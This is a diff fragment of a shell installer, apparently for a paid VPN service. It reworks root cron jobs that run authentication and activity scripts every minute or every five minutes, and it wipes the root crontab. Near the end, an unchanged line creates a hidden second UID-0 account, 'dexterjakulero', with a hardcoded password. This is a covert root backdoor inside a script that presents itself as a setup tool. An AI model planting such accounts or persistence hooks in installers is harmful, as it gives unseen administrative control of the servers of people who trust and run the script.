@@ -642,7 +642,7 @@ API_LINK='konnekz-vpn.xyz/api/premium';
 API_KEY='TKnetwork';
 
 
-cat <<EOF >/home/authentication.sh
+cat <<EOF >/root/authentication.sh
 #!/bin/bash
 SHELL=/bin/bash
 PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
@@ -659,7 +659,13 @@ sleep 15
 bash /root/deleted.sh
 EOF
 
-echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+echo -e "* *\t* * *\troot\tsudo bash /root/authentication.sh" >> "/etc/cron.d/account"
+
+echo "*/5 * * * * /bin/bash  /home/active.sh >/dev/null 2>&1" | crontab -
+
+echo "* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1" | crontab -
+
+sh active.sh | tee -a  /home/active.sh
 }
 
 serviceenable () {
@@ -949,13 +955,10 @@ swapoff -a && swapon -a
 echo "Ram Cleaned!"
 EOM
 
-cat << EOF > /var/spool/cron/root
-* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1
-*/15 * * * * /bin/bash  /home/active.sh >/dev/null 2>&1
-*/5 * * * * /bin/bash /root/auto >/dev/null 2>&1
-EOF
+crontab -r
+echo "SHELL=/bin/bash
+*/5 * * * * /bin/bash /root/auto >/dev/null 2>&1" | crontab -
 
-sh active.sh | tee -a  /root/active.sh
 bash /root/auto
 
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
